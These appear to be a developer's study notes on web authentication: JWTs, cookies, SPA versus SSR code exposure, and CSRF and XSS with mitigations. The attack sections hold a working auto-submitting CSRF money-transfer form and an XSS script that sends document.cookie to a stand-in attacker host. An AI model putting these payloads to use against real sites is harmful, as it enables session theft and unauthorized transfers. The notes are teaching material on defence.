> Initially keep information in chunks , later organize it in seamless way

> # What are JWTs?   
> JSON data + Signature (cryptographically signed) = JWT


> # Stateless JWT   
> A JWT that is entirely self-contained and holds all user information, necessary to complete   
> a transaction within it. eg: username, email, firstName, lastName etc.

> # Statful JWT   
> A JWT that only contains a sessionId. All User Data is stored server side and retrieved from a database.

> # Session Tokens
> A cryptographically signed (or unsigned) session identifier. All user data is stored server side
> and retrieved from a database

> # Cookies  
> An http header field, that allows you to store or retrieve   
> key/value data, set data expiration times, and apply various   
> other data integrity rules. Caps out at ~4K.

> # Creating Cookies
```json
// WEB_SERVER will set this in response headers
{
 "Set-Cookie": "session=12345"
}
```
> # Reading Cookies
```json
// WEB_SERVER will read this in REQUEST HEADER
{
 "Cookie": "session=12345"
}
```


> # CSRF
>  with cookies you are susceptible to CSRF attacks   
>  with local-storage you are safe from CSRF, but opened yourself upto a much greater attack vector XSS.   
>  CSRF is trivial to fix, XSS not so much.


> # What is **Auth**
1. Authentication
2. Authorization

> # Where does auth happen?   
> The SERVER (on requests)   

> # What about the clients?   
> Clients make REQUESTS!   


> # Getting Authenticated Flow

> 1. User opens page for the first time
> 2. User signs in (Fires request to SERVER, that returns secure COOKIE)
> 3. Client stores that secure COOKIE (in a way that can't be accessed by your javascript)
> 4. From here on, ALL REQUESTS to the SERVER will include that COOKIE.



> # SPA vs SSR 
> **SPA**: In a Vite with React setup, the entire JavaScript bundle is typically loaded by the client's browser upon the initial visit,   
> regardless of the user's authentication status. This means that all the code related to the application, including routes and components
> that might only be relevant post-authentication, is available to the client.

> **SPA**: During the login flow, even though the user has not authenticated yet, they have access to the entire application's code.   
> The **actual protection** of data and restricted actions relies on API-level security   
> (i.e., the server not providing sensitive data or performing actions without valid authentication).

> **SPA**: However, as long as sensitive data and actions are protected server-side, this exposure does not inherently lead to a security vulnerability,   
> but rather to a **potential disclosure of application structure and logic**.   

> **SSR**: **Selective Bundle Loading**: Remix adopts a different approach. It can selectively load resources based on the request context.   
> Since it supports server-side rendering (SSR), the initial HTML sent to the client can be tailored based on the user's authentication status.

> **SSR**: Offers more control over what is sent to the client, enhancing security and potentially improving load performance.   
> Ideal for applications where the exposure of post-login application structure and logic is a concern.   

> **SPA**: Implement code splitting to load sensitive parts only when needed. However, understand that this does not prevent a determined user from accessing these chunks.
> Use code splitting to separate the JavaScript bundle into smaller chunks. This prevents loading all scripts upfront.   
> Implement route-based code splitting so that the code for authenticated routes is loaded only when those routes are accessed.   


> **SPA**: For someone who is not authenticated to find out the URL of a private chunk in a Vite with React application,   
> they would typically have to rely on indirect methods, as they wouldn't have direct access to the network requests   
> that load these chunks post-authentication. Here's how they might approach it
> Guesswork Based on File Naming Conventions   
> The initial JavaScript bundle loaded by the application may contain references to other chunks, such as dynamic import statements.

# CSRF Attack and Mitigation

# CSRF Attack Explanation with Practical Examples

1. **CSRF Definition**: Cross-Site Request Forgery (CSRF) is a security threat where a malicious website causes a user's browser to perform an action on another website where the user is authenticated.

2. **Typical Attack Flow**:
   - A user logs into `www.legitbank.com` and receives a session cookie.
   - Without logging out, the user visits a malicious site: `www.attackersite.com`.
   - `www.attackersite.com` contains a form or script that makes a request to `www.legitbank.com` (e.g., to transfer money) using the user's credentials.
Example Form:
```jsx
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Site</title>
    <script>
        function submitRequest() {
            document.getElementById("maliciousForm").submit();
        }
        window.onload = submitRequest; // Automatically submit the form on page load
    </script>
</head>
<body>
    <form id="maliciousForm" action="https://www.legitbank.com/transferMoney" method="POST" style="display:none;">
        <input type="hidden" name="amount" value="1000" />
        <input type="hidden" name="toAccount" value="attacker-account-number" />
    </form>
</body>
</html>

```
3. **Automatic Cookie Transmission**:
   - When the malicious site makes a request to `www.legitbank.com`, the user's browser automatically attaches the session cookie from `www.legitbank.com`.
   - The browser does this because it recognizes the domain of the cookie (`www.legitbank.com`) and includes it in all requests to that domain.

4. **Server Misinterpretation**:
   - `www.legitbank.com` receives the forged request with the user's cookie, which makes the request appear legitimate.
   - If `www.legitbank.com` doesn't verify the origin of the request, it might process the action (e.g., transferring funds), thinking it was intentionally made by the user.

5. **Lack of User Consent**:
   - The key to CSRF is that the action on `www.legitbank.com` is executed without the user's knowledge or consent.
   - The user might not even realize that `www.attackersite.com` has performed actions on their behalf on `www.legitbank.com`.


## Mitigation Strategies
6. **Use CSRF Tokens**: Implement server-side generated CSRF tokens that the client must include in requests. The server validates this token before processing requests.
7. **SameSite Cookie Attribute**: Set the `SameSite` attribute for cookies. `SameSite=Strict` or `Lax` prevents cookies from being sent in cross-origin requests, thwarting CSRF attempts.
8. **HttpOnly and Secure Attributes**: Mark cookies as `HttpOnly` to prevent access via JavaScript and `Secure` to ensure they are sent over HTTPS.
9. **Validate Referer Header**: Check the `Referer` header in HTTP requests to ensure requests are coming from allowed domains.
10. **User Education**: Educate users about the risks of phishing and the importance of security practices, such as not clicking on suspicious links.


# XSS Attack and Mitigation

## XSS Attack
1. **XSS Definition**: Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious scripts into web pages viewed by other users.
2. **Attack Example**: An attacker posts a malicious script on `www.legitbank.com` through a comment section: `<script>fetch('https://www.attackersite.com/steal-cookie?cookie=' + document.cookie);</script>`.
3. **Script Execution**: When other users view the page, the script executes in their browser, potentially stealing their session cookies or performing other malicious actions.
4. **localStorage Exploitation**: If `www.legitbank.com` stores sensitive tokens in `localStorage`, a similar script can send these tokens to `www.attackersite.com`.
5. **Types of XSS**:
    - *Stored XSS*: The malicious script is stored on the target server (e.g., in a database) and is executed every time the compromised page is loaded.
    - *Reflected XSS*: The malicious script is part of the request sent to the server and is reflected back in the server's response.

## Mitigation Strategies
6. **Input Sanitization**: Implement server-side input sanitization to prevent malicious scripts from being saved or executed.
7. **Content Security Policy (CSP)**: Use CSP headers to restrict where scripts can load from, reducing the risk of executing injected scripts.
8. **Escaping User Output**: Escape special characters in user-generated content before rendering them on web pages.
9. **HttpOnly Cookies**: Use `HttpOnly` flag on cookies to prevent JavaScript from accessing them, protecting session cookies from being stolen by scripts.
10. **Regular Security Audits**: Conduct vulnerability assessments and security reviews to identify and fix XSS vulnerabilities.

